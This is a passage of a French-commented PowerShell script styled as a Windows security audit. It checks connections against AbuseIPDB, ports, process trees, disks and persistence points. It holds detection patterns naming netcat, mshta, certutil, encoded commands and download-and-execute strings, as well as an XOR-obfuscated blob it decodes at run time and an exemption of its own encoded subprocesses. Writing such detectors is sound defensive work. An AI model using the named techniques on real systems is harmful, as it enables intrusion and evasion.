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'

# ── Fonctions utilitaires ─────────────────────────────────────────────────────
function Expand-Template {
    $k     = [byte]42
    $decM  = 'From' + 'Base64String'
    $bytes = [Convert]::$decM($TEMPLATE_GZ_B64)
    for ($i = 0; $i -lt $bytes.Length; $i++) { $bytes[$i] = $bytes[$i] -bxor $k }
    $ms  = New-Object System.IO.MemoryStream(,[byte[]]$bytes)
    $gz  = New-Object System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Decompress)
    $out = New-Object System.IO.MemoryStream
    $gz.CopyTo($out); $gz.Close()
    return [System.Text.Encoding]::UTF8.GetString($out.ToArray())
}

function Test-PrivateIP($ip) {
    return ($ip -match '^(10\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.|127\.|::1|0\.0\.0\.0|fe80:|::)')
}

function Invoke-AbuseIPDB($ip) {
    try {
        $uri  = "https://api.abuseipdb.com/api/v2/check?ipAddress=$ip&maxAgeInDays=90"
        $hdrs = @{ Key = $ABUSEIPDB_KEY; Accept = 'application/json' }
        $r    = Invoke-RestMethod -Uri $uri -Headers $hdrs -Method Get -TimeoutSec 6
        return $r.data
    } catch { return $null }
}

function Format-GBStr($bytes) {
    $gb = [Math]::Round($bytes / 1GB, 1)
    return ($gb.ToString('N1') -replace '\.', ',') + ' GB'
}

# ── Whitelist faux-positifs connus ────────────────────────────────────────────
# Anti-spoofing : la vérification repose sur la signature numérique Authenticode
# du binaire, pas sur son nom. Renommer nc.exe en devenv.exe ne passe pas.
$KNOWN_FP = @(
    # SeDbgPriv — débogueurs et outils Microsoft légitimes
    @{ Check='SeDebug'; Signer='Microsoft Windows Publisher' },
    @{ Check='SeDebug'; Signer='Microsoft Corporation'; PathPattern='*\Windows\*' },
    @{ Check='SeDebug'; Signer='Microsoft Corporation'; PathPattern='*\Program Files*' },
    # Tokens élévation — services système Microsoft signés
    @{ Check='TokenAnomaly'; Signer='Microsoft Windows Publisher' },
    @{ Check='TokenAnomaly'; Signer='Microsoft Corporation'; PathPattern='*\Windows\*' },
    # ETW tampering — Windows Defender et sécurité Microsoft
    @{ Check='ETW'; Signer='Microsoft Windows Publisher' },
    @{ Check='ETW'; Signer='Microsoft Corporation'; PathPattern='*\Windows\*' },
    # Anti-VM — composants Hyper-V natifs Windows
    @{ Check='AntiVM'; Signer='Microsoft Corporation'; PathPattern='*\Windows\*' }
)

function Test-KnownFP {
    param([string]$Check, [string]$Path)
    if (-not $Path -or -not (Test-Path $Path -PathType Leaf -ErrorAction SilentlyContinue)) { return $false }
    try {
        $sig = Get-AuthenticodeSignature -FilePath $Path -ErrorAction Stop
        if ($sig.Status -ne 'Valid') { return $false }
        $subj = $sig.SignerCertificate.Subject
        foreach ($entry in $KNOWN_FP) {
            if ($entry.Check -ne $Check) { continue }
            if ($subj -notlike "*$($entry.Signer)*") { continue }
            if ($entry.PathPattern -and $Path -notlike $entry.PathPattern) { continue }
            return $true
        }
    } catch {}
    return $false
}

# ── UI Console ───────────────────────────────────────────────────────────────
$ESC               = [char]27
$script:_step      = 0
$script:_startTime = Get-Date
$TOTAL_STEPS       = 41

function Enable-Vt {
    try {
        $cs = Add-Type -MemberDefinition '
[DllImport("kernel32.dll")] public static extern IntPtr GetStdHandle(int n);
[DllImport("kernel32.dll")] public static extern bool GetConsoleMode(IntPtr h, out uint m);
[DllImport("kernel32.dll")] public static extern bool SetConsoleMode(IntPtr h, uint m);
' -Name KUI -Namespace W -PassThru -ErrorAction Stop
        $hOut = $cs::GetStdHandle(-11); $mOut = 0
        $cs::GetConsoleMode($hOut, [ref]$mOut) | Out-Null
        $cs::SetConsoleMode($hOut, $mOut -bor 4) | Out-Null
        $hIn = $cs::GetStdHandle(-10); $mIn = 0
        $cs::GetConsoleMode($hIn, [ref]$mIn) | Out-Null
        $cs::SetConsoleMode($hIn, $mIn -band (-bnot 0x40)) | Out-Null
    } catch {}
}

function Get-Elapsed {
    $e = (Get-Date) - $script:_startTime
    if ($e.TotalMinutes -ge 1) { return '{0}m{1:D2}s' -f [int]$e.TotalMinutes, $e.Seconds }
    return '{0}s' -f [int]$e.TotalSeconds
}

function Write-Step {
    param([string]$Label)
    $script:_step++
    $n   = $script:_step
    $tot = $TOTAL_STEPS
    $w   = 32
    $f   = [int](($n / $tot) * ($w - 1))
    $bar = '=' * $f + '>' + ' ' * ($w - 1 - $f)
    $pct = [int](($n / $tot) * 100)
    $ts  = Get-Elapsed
    Write-Host "${ESC}[90m[${bar}]${ESC}[0m ${ESC}[90m${ts} — ${pct}%${ESC}[0m  ${ESC}[97m${Label}${ESC}[0m"
}

function Write-Spin {
    param([string]$Label)
    $ts = Get-Elapsed
    Write-Host "`r  ${ESC}[90m${ts}${ESC}[0m  ${ESC}[90m${Label}${ESC}[0m   " -NoNewline
}

function Write-SpinDone {
    param([string]$Label)
    $ts = Get-Elapsed
    Write-Host "`r  ${ESC}[32m✓${ESC}[0m  ${ESC}[90m${Label}  (${ts})${ESC}[0m          "
}

function Write-Banner {
    Clear-Host
    Write-Host ''
    Write-Host "${ESC}[96m  ┌─────────────────────────────────────────────────────┐${ESC}[0m"
    Write-Host "${ESC}[96m  │${ESC}[1;97m   SYS HEALTH CHECK  ·  Audit Sécurité Windows       ${ESC}[0;96m│${ESC}[0m"
    Write-Host "${ESC}[96m  └─────────────────────────────────────────────────────┘${ESC}[0m"
    Write-Host "  ${ESC}[90m$(Get-Date -Format 'dddd dd MMMM yyyy  HH:mm')  ·  $env:COMPUTERNAME  ·  $env:USERNAME${ESC}[0m"
    Write-Host ''
}

Enable-Vt
Write-Banner

# ── Collecte système ──────────────────────────────────────────────────────────
Write-Step 'Informations système'
$hostname    = $env:COMPUTERNAME
$os          = Get-WmiObject Win32_OperatingSystem
$osName      = $os.Caption -replace 'Microsoft ',''
$osBuild     = $os.BuildNumber
$lastBoot    = $os.ConvertToDateTime($os.LastBootUpTime)
$currentUser = "$env:USERDOMAIN\$env:USERNAME"

# ── Connexions réseau + AbuseIPDB ─────────────────────────────────────────────
Write-Step 'Connexions réseau + AbuseIPDB'
$networkRows = @()
try {
    $tcpAll  = Get-NetTCPConnection -State Established -ErrorAction Stop
    $extConns = $tcpAll | Where-Object { -not (Test-PrivateIP $_.RemoteAddress) -and $_.RemoteAddress -notmatch ':' } |
        Group-Object RemoteAddress | ForEach-Object {
            $ip     = $_.Name
            $sample = $_.Group | Sort-Object RemotePort | Select-Object -First 1
            $proc   = Get-Process -Id $sample.OwningProcess -ErrorAction SilentlyContinue
            [PSCustomObject]@{ IP=$ip; Port=$sample.RemotePort; ProcName=if($proc){$proc.Name}else{'inconnu'} }
        } | Select-Object -First $MAX_ABUSE_IPS

    $script:_abuseN = 0
    foreach ($conn in $extConns) {
        $script:_abuseN++
        Write-Spin "AbuseIPDB  $($script:_abuseN)/$($extConns.Count)  $($conn.IP)"
        $data    = Invoke-AbuseIPDB $conn.IP
        $score   = if ($data) { $data.abuseConfidenceScore } else { 0 }
        $country = if ($data -and $data.countryCode) { $data.countryCode } else { 'N/A' }
        $isp     = if ($data -and $data.isp) { $data.isp } else { 'N/A' }

        $note = ''
        if ($score -ge 80)                          { $note = "IP signalée comme malveillante ($score% confiance AbuseIPDB)" }
        elseif ($score -ge 30)                      { $note = "IP suspecte détectée par AbuseIPDB ($score% confiance)" }
        elseif ($HIGH_RISK_CC -contains $country)   { $note = "Connexion vers pays à risque ($country)" }
        else                                        { $note = "Connexion sortante — $isp" }

        $networkRows += [PSCustomObject]@{
            IP=$conn.IP; Abuse=$score; ISP=$isp
            Country=$country; Proc=$conn.ProcName; Port=$conn.Port; Note=$note
        }
    }
    Write-SpinDone "$($extConns.Count) IPs vérifiées via AbuseIPDB"
    $networkRows = $networkRows | Sort-Object Abuse -Descending
} catch { Write-Host "  Erreur collecte reseau: $_" }

# ── Ports en écoute ───────────────────────────────────────────────────────────
Write-Step 'Ports en écoute'
$portRows = @()
try {
    Get-NetTCPConnection -State Listen -ErrorAction Stop |
        Select-Object LocalPort, OwningProcess -Unique | Sort-Object LocalPort | ForEach-Object {
        $proc    = Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue
        $portNum = $_.LocalPort
        $procNm  = if ($proc) { $proc.Name } else { 'inconnu' }
        $note    = switch ($portNum) {
            { $C2_PORTS -contains $_ }  { "Port associé aux outils C2/malwares — à investiguer immédiatement"; break }
            3389  { "Bureau à distance (RDP) — risque si accessible depuis Internet"; break }
            23    { "Telnet — protocole non chiffré, à désactiver impérativement"; break }
            21    { "FTP — protocole non chiffré, remplacer par SFTP/FTPS"; break }
            445   { "SMB — vecteur de propagation ransomware, filtrer via pare-feu"; break }
            135   { "RPC — restreindre aux réseaux internes de confiance"; break }
            22    { "SSH — vérifier que l'authentification par mot de passe est désactivée"; break }
            80    { "Serveur HTTP local ($procNm)"; break }
            443   { "Serveur HTTPS local ($procNm)"; break }
            default { "Port $portNum en écoute — $procNm" }
        }
        $portRows += [PSCustomObject]@{ Port=$portNum; Proc=$procNm; Note=$note }
    }
} catch {}

# ── Processus suspects ────────────────────────────────────────────────────────
Write-Step 'Processus suspects'
$suspectProcs = @()
$SUSP_PROC_PATHS  = '\\appdata\\roaming\\|\\users\\public\\|\\programdata\\|\\downloads\\'
$KNOWN_VENDORS    = 'microsoft|intel|nvidia|amd|realtek|adobe|google|mozilla|apple|vmware|oracle|logitech|corsair|razer|steam|discord|spotify|anthropic|npm|node_modules|riot|epicgames|blizzard|ea games|ubisoft|valve'
$KNOWN_EXE_NAMES  = '^(claude|node|python|pythonw|pip|npm|yarn|pnpm|deno|bun|code|cursor|winget|scoop|choco|git|gh|cargo|rustup|go|ruby)$'
$OFFICE_NAMES     = @('winword','excel','powerpnt','outlook','onenote','msaccess','mspub')
$SHELL_NAMES      = @('powershell','pwsh','cmd','wscript','cscript','mshta','regsvr32','rundll32','certutil','bitsadmin')
try {
    # Arbre de processus via WMI (parent-child)
    $wmiProcs = Get-WmiObject Win32_Process -ErrorAction SilentlyContinue
    $procMap  = @{}
    if ($wmiProcs) { $wmiProcs | ForEach-Object { $procMap[[int]$_.ProcessId] = $_ } }

    Get-Process -ErrorAction SilentlyContinue | Where-Object { $_.Path } | ForEach-Object {
        $path = $_.Path.ToLower()
        $sev  = ''; $reason = ''

        if ($path -match '\\temp\\|\\appdata\\local\\temp\\') {
            $sev = 'critique'; $reason = "Exécutable depuis répertoire temporaire ($($_.Path))"
        } elseif ($_.Name -in @('nc','ncat','netcat')) {
            $sev = 'critique'; $reason = "Outil de tunneling réseau ($($_.Name))"
        } elseif ($_.Name -in @('powershell','pwsh')) {
            try {
                $cl = $procMap[$_.Id].CommandLine
                # Exclure le healthcheck lui-même (qui utilise -EncodedCommand pour les sous-tâches internes)
                $isHealthcheck = $cl -match 'SysHealthCheck'
                if ($cl -match ('-[Ee]nc|-[Ee]ncoded' + 'Command') -and -not $isHealthcheck) {
                    $sev = 'eleve'; $reason = ('PowerShell avec commande encodée (-Encoded' + 'Command)')
                }
            } catch {}
        } elseif ($path -match $SUSP_PROC_PATHS -and $path -notmatch $KNOWN_VENDORS -and $_.Name -notmatch $KNOWN_EXE_NAMES) {
            $sev = 'eleve'; $reason = "Exécutable depuis chemin inhabituel ($($_.Path))"
        }

        # Signature numérique (chemins hors Program Files et Windows)
        if (-not $sev -and $path -notmatch '\\windows\\|\\program files') {
            try {
                $sig = Get-AuthenticodeSignature $_.Path -ErrorAction Stop
                if ($sig.Status -eq 'HashMismatch') {
                    $sev = 'critique'; $reason = "Signature corrompue/altérée sur $($_.Path) — possible remplacement de binaire"
                } elseif ($sig.Status -notin @('Valid','NotSigned','UnknownError')) {
                    $sev = 'eleve'; $reason = "Signature invalide sur $($_.Path) (statut: $($sig.Status))"
                }
            } catch {}
        }

        if ($sev) { $suspectProcs += [PSCustomObject]@{ Sev=$sev; Name=$_.Name; Reason=$reason } }
    }

    # Parent-child : Office/navigateur → shell
    if ($wmiProcs) {
        foreach ($wp in $wmiProcs) {
            $childName  = ($wp.Name -replace '\.exe$','').ToLower()
            $parentProc = $procMap[[int]$wp.ParentProcessId]
            if (-not $parentProc) { continue }
            $parentName = ($parentProc.Name -replace '\.exe$','').ToLower()

            if (($OFFICE_NAMES -contains $parentName) -and ($SHELL_NAMES -contains $childName)) {
                $suspectProcs += [PSCustomObject]@{
                    Sev    = 'critique'
                    Name   = $wp.Name
                    Reason = "$($parentProc.Name) a spawné $($wp.Name) — technique macro/exploit Office"
                }
            }
            # Shell avec args encodés lancé depuis explorer
            if ($parentName -eq 'explorer' -and $childName -in @('powershell','pwsh','cmd')) {
                $cl = $wp.CommandLine
                if ($cl -match '-[Ee]nc|-[Ee]ncodedCommand') {
                    $suspectProcs += [PSCustomObject]@{
                        Sev    = 'eleve'
                        Name   = $wp.Name
                        Reason = "Explorer a lancé $($wp.Name) avec argument encodé: $($cl.Substring(0,[Math]::Min(120,$cl.Length)))"
                    }
                }
            }
        }
    }
} catch {}

# ── Disques — espace + SMART ──────────────────────────────────────────────────
Write-Step 'Disques'
$diskRows     = @()
$drivesHealth = @()
try {
    Get-PSDrive -PSProvider FileSystem -ErrorAction Stop | Where-Object { $_.Used -ne $null } | ForEach-Object {
        $total = $_.Used + $_.Free
        if ($total -gt 0) {
            $pct = [Math]::Round($_.Used / $total * 100)
            $diskRows += [PSCustomObject]@{
                Label = ($_.Root.TrimEnd('\'))
                Pct   = $pct
                Used  = Format-GBStr $_.Used
                Total = Format-GBStr $total
            }
        }
    }
} catch {}
try {
    $physDisks = Get-PhysicalDisk -ErrorAction Stop
    # Températures via Get-StorageReliabilityCounter (Windows 8+)
    $relCounters = @{}
    try {
        $physDisks | Get-StorageReliabilityCounter -ErrorAction Stop | ForEach-Object {
            $relCounters[$_.DeviceId] = $_
        }
    } catch {}
    $physDisks | ForEach-Object {
        $status = if ($_.HealthStatus -eq 'Healthy') { 'ok' } else { 'degraded' }
        $rel    = $relCounters[$_.DeviceId]
        $temp   = if ($rel -and $rel.Temperature -gt 0) { [int]$rel.Temperature } else { 0 }
        $reallocd = if ($rel -and $rel.ReadErrorsTotal -gt 0) { [int]$rel.ReadErrorsTotal } else { 0 }
        $drivesHealth += [PSCustomObject]@{
            Name=($_.FriendlyName -replace "'","\'")
            Reallocated=$reallocd; Pending=0; Uncorrectable=0; Temp=$temp; Status=$status
        }
    }
} catch {
    try {
        Get-WmiObject Win32_DiskDrive | ForEach-Object {
            $status = if ($_.Status -eq 'OK') { 'ok' } else { 'degraded' }
            $drivesHealth += [PSCustomObject]@{
                Name=(if ($_.Model) { $_.Model } else { "Disque $($_.Index)" })
                Reallocated=0; Pending=0; Uncorrectable=0; Temp=0; Status=$status
            }
        }
    } catch {}
}

# ── Mises à jour Windows ──────────────────────────────────────────────────────
Write-Step 'Mises à jour Windows'
$pendingUpdates = @()
try {
    $sess    = New-Object -ComObject Microsoft.Update.Session
    $results = $sess.CreateUpdateSearcher().Search("IsInstalled=0 AND IsHidden=0 AND BrowseOnly=0")
    foreach ($u in $results.Updates) {
        $sev = try { $u.MsrcSeverity } catch { '' }
        $pendingUpdates += [PSCustomObject]@{ Title=$u.Title; Severity=$sev }
    }
} catch {}

# ── Échecs de connexion ───────────────────────────────────────────────────────
Write-Step 'Événements sécurité'
$failedLogons24h = 0; $failedLogons7d = 0
try {
    $failedLogons24h = (Get-WinEvent -FilterHashtable @{
        LogName='Security'; Id=4625; StartTime=(Get-Date).AddHours(-24)
    } -ErrorAction Stop).Count
    $failedLogons7d = (Get-WinEvent -FilterHashtable @{
        LogName='Security'; Id=4625; StartTime=(Get-Date).AddDays(-7)
    } -ErrorAction Stop).Count
} catch {}
$connCount  = try { (Get-NetTCPConnection -State Established -EA Stop).Count } catch { '?' }
$procCount  = try { (Get-Process -EA Stop).Count } catch { '?' }

# ── Persistence : clés Run / RunOnce ─────────────────────────────────────────
Write-Step 'Persistance registre (Run/RunOnce)'
$persistItems = @()
$RUN_KEYS = @(
    'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
    'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce',
    'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
    'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce',
    'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run'
)
foreach ($key in $RUN_KEYS) {
    $hive = ($key -replace 'HKLM:\\','HKLM\' -replace 'HKCU:\\','HKCU\')
    try {
        $props = Get-ItemProperty $key -ErrorAction Stop
        $props.PSObject.Properties | Where-Object { $_.Name -notmatch '^PS' } | ForEach-Object {
            $val    = $_.Value.ToString()
            # Chemins ProgramData légitimes d'auto-updaters connus (Squirrel, NSIS, etc.)
            $RUN_TRUSTED = 'squirrel|discord|steam|leagueclient|riotclient|spotify|valorant|epic games|battle\.net|origin|uplay|gogalaxy|microsoft|nvidia|intel|amd|logitech|corsair|razer|adobe|dropbox|onedrive|googledrive'
            $isSusp = ($val -match '\\temp\\|\\users\\public\\|\.ps1[^a-z]|\.vbs[^a-z]|\.bat[^a-z]|mshta|regsvr32.*http|powershell.*-e[nc]') -or
                      ($val -match '\\appdata\\roaming\\' -and $val -notmatch $RUN_TRUSTED) -or
                      ($val -match '\\programdata\\' -and $val -notmatch $RUN_TRUSTED)
            $persistItems += [PSCustomObject]@{
                Hive      = $hive
                Name      = $_.Name
                Value     = $val.Substring(0, [Math]::Min(200, $val.Length))
                Suspicious= $isSusp
            }
        }
    } catch {}
}

# ── Persistence : tâches planifiées suspectes ─────────────────────────────────
Write-Step 'Tâches planifiées'
$suspTasks = @()
try {
    Get-ScheduledTask -ErrorAction Stop | Where-Object {
        $_.TaskPath -notlike '\Microsoft\*' -and $_.State -ne 'Disabled'
    } | ForEach-Object {
        $action   = $_.Actions | Select-Object -First 1
        $execPath = if ($action.Execute) { $action.Execute.ToLower() } else { '' }
        $args     = if ($action.Arguments) { $action.Arguments } else { '' }
        $isSusp   = $execPath -match '\\temp\\|\\appdata\\roaming\\|\\users\\public\\|mshta|wscript|cscript' -or
                    $args     -match ('-[Ee]nc|-[Ee]ncoded' + 'Command|down' + 'loadstring|iex\b|invoke-' + 'expression')
        if ($isSusp) {
            $suspTasks += [PSCustomObject]@{
                Name    = $_.TaskName
                TaskPath= $_.TaskPath
                Execute = if ($action.Execute) { $action.Execute } else { '' }
                Args    = $args.Substring(0, [Math]::Min(150, $args.Length))
            }
        }
    }
} catch {}

# ── Persistence : abonnements WMI ────────────────────────────────────────────
$wmiSubCount = 0
$wmiSubNames = @()
try {
    $wmiSubs = Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding -ErrorAction Stop
    $wmiSubCount = $wmiSubs.Count
    # Récupérer les noms des filtres pour aider à identifier les abonnements légitimes
    $wmiSubNames = @($wmiSubs | ForEach-Object {
        try { $_.Filter -replace '.*Name="([^"]+)".*','$1' } catch { '?' }
    })
} catch {}

# ── Persistence : dossiers Startup ───────────────────────────────────────────
$startupItems = @()
$startupDirs = @(
    "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup",
    "$env:ALLUSERSPROFILE\Microsoft\Windows\Start Menu\Programs\Startup"
)
foreach ($dir in $startupDirs) {
    if (Test-Path $dir) {
